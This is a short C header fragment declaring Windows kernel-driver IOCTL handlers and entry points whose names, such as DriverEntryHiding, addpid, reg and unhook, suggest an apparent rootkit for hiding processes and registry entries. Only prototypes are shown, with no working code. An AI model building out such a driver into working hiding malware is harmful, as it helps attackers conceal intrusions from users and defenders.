
NTSTATUS do_ioctl_unhook(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp);
NTSTATUS do_ioctl_admin(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp);
NTSTATUS do_ioctl_addpid(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp);
NTSTATUS do_ioctl_reg(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp);
NTSTATUS do_ioctl_uninstall(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp);

NTSTATUS DriverEntryHiding( IN PDRIVER_OBJECT dobj, IN PUNICODE_STRING regpath);
void OnUnloadHiding(IN PDRIVER_OBJECT dobj);